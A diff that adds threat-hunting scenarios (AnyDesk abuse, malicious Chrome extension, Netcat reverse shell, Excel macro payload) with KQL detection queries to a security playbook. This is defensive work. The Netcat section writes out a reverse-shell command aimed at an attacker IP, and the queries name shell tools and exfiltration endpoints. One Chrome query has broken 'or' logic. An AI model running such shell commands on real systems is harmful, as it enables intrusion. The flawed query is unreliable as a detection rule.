@@ -131,7 +131,6 @@ DeviceFileEvents
 ---
 
 
-
 ---
 
 ## Additional Notes:
@@ -223,6 +222,7 @@ DeviceNetworkEvents
 ---
 
 
+
 ---
 
 ## Additional Notes:
@@ -268,11 +268,6 @@ DeviceEvents
 
 ---
 
-## Created By:
-- **Author Name**: Nigel T
-- **Author Contact**: https://www.linkedin.com/in/nigel-thompson-8a7995244/
-- **Date**: April 17, 2025
-
 
 
 ---
@@ -280,3 +275,199 @@ DeviceEvents
 ## Additional Notes:
 - Combine with HR attrition watchlists and DLP rules.
 - Correlate file copy events with offboarding timelines.
+
+
+# Threat Event (Unauthorized Remote Access Tools (AnyDesk))
+**Installation and Use of Unauthorized AnyDesk Remote Access**
+
+## Reason for the Hunt:
+IT noticed remote control sessions occurring during non-business hours.
+AnyDesk was found installed on systems not enrolled in remote support policy.
+
+---
+
+## Steps the "Bad Actor" Took to Create Logs and IoCs:
+1. User downloads AnyDesk from official or clone site.
+2. Executes installer silently or interacts with minimal prompts.
+3. Accepts incoming session request from attacker-controlled system.
+4. Attacker gains GUI access and moves laterally.
+5. Attempts made to disable security tools or access internal systems.
+
+---
+
+## Tables Used to Detect IoCs:
+| **Name** | **Description** |
+|----------|----------------|
+| DeviceFileEvents | Detect installer drop and binaries |
+| DeviceProcessEvents | Monitor execution and session start |
+| DeviceNetworkEvents | Check external IPs connecting to AnyDesk |
+
+---
+
+## Related Queries (KQL):
+```kql
+DeviceProcessEvents
+| where FileName in~ ("AnyDesk.exe", "AnyDeskSetup.exe")
+
+DeviceNetworkEvents
+| where InitiatingProcessFileName == "AnyDesk.exe"
+| project Timestamp, DeviceName, RemoteIP, RemoteUrl
+```
+
+---
+
+
+
+---
+
+## Additional Notes:
+- Consider AppLocker or Defender App Control to block unauthorized remote access tools.
+- Review auto-start settings for persistence.
+
+
+# Threat Event (Malicious Chrome Extension)
+**Suspicious Chrome Extension Capturing Clipboard and Tabs**
+
+## Reason for the Hunt:
+User reported browser acting strangely.
+Investigation revealed a side-loaded Chrome extension harvesting user actions.
+
+---
+
+## Steps the "Bad Actor" Took to Create Logs and IoCs:
+1. Attacker tricks user into downloading CRX file or accessing malicious webstore clone.
+2. Chrome extension is manually loaded or force-installed via policy change.
+3. Extension monitors clipboard, DOM, or cookies.
+4. Sends data to attacker C2 (e.g., via webhook or IP endpoint).
+
+---
+
+## Tables Used to Detect IoCs:
+| **Name** | **Description** |
+|----------|----------------|
+| DeviceFileEvents | Detect CRX or unpacked extension folders |
+| DeviceProcessEvents | Chrome launch with suspicious flags |
+| DeviceNetworkEvents | Extension contacting external domains |
+
+---
+
+## Related Queries (KQL):
+```kql
+DeviceFileEvents
+| where FolderPath contains "Chrome\User Data\Default\Extensions"
+
+DeviceProcessEvents
+| where ProcessCommandLine contains "--load-extension"
+
+DeviceNetworkEvents
+| where RemoteUrl contains ".webhook.site" or ".ngrok.io" 
+```
+
+---
+
+
+
+---
+
+## Additional Notes:
+- Chrome extensions can bypass traditional endpoint scanning.
+- Enable Chrome enterprise reporting for visibility.
+
+
+# Threat Event (Reverse Shell via Netcat)
+**Backdoor Shell Established Using Netcat**
+
+## Reason for the Hunt:
+High-privilege user machine showed suspicious connections to a known C2 IP.
+Netcat found running in hidden terminal session.
+
+---
+
+## Steps the "Bad Actor" Took to Create Logs and IoCs:
+1. Attacker drops nc.exe or variant on target system.
+2. Opens reverse shell with: nc.exe <attacker_ip> <port> -e cmd.exe
+3. Attacker interacts with target over open port.
+4. Persistence achieved via task scheduler or registry key.
+
+---
+
+## Tables Used to Detect IoCs:
+| **Name** | **Description** |
+|----------|----------------|
+| DeviceFileEvents | Netcat binary download or creation |
+| DeviceProcessEvents | Netcat execution |
+| DeviceNetworkEvents | Connection to external IP or port |
+
+---
+
+## Related Queries (KQL):
+```kql
+DeviceProcessEvents
+| where ProcessCommandLine contains "nc.exe" and ProcessCommandLine contains "-e"
+
+DeviceNetworkEvents
+| where RemotePort in (4444, 1337, 8080)
+| where InitiatingProcessFileName == "nc.exe" 
+```
+
+---
+
+
+
+---
+
+## Additional Notes:
+- Netcat and its variants (ncat, ncat64) should be monitored or blacklisted.
+- Detecting use of -e is key for identifying shells.
+
+
+# Threat Event (Malicious Excel Macro)
+**Excel File with Embedded Macro Payload**
+
+## Reason for the Hunt:
+Finance user received phishing email with invoice attachment.
+File was opened and triggered PowerShell payload.
+
+---
+
+## Steps the "Bad Actor" Took to Create Logs and IoCs:
+1. Phishing email delivers .xlsm or .xls file.
+2. User enables content/macro.
+3. Macro executes VBA that runs PowerShell.
+4. PowerShell downloads and executes malware payload.
+
+---
+
+## Tables Used to Detect IoCs:
+| **Name** | **Description** |
+|----------|----------------|
+| DeviceProcessEvents | PowerShell spawned from Excel |
+| DeviceFileEvents | File opened from suspicious source |
+| DeviceNetworkEvents | Network beacon from macro payload |
+
+---
+
+## Related Queries (KQL):
+```kql
+DeviceProcessEvents
+| where InitiatingProcessFileName == "EXCEL.EXE"
+| where FileName == "powershell.exe"
+
+DeviceFileEvents
+| where FileName endswith ".xlsm" or FileName endswith ".xls"
+| where FolderPath contains "Downloads" 
+```
+
+---
+
+## Created By:
+- **Author Name**: Nigeltho12
+- **Author Contact**: https://www.linkedin.com/in/nigel-thompson-8a7995244/
+- **Date**: April 17, 2025
+
+
+---
+
+## Additional Notes:
+- Block macros from Internet via GPO.
+- Use AMSI or Defender for Office for behavioral detection.
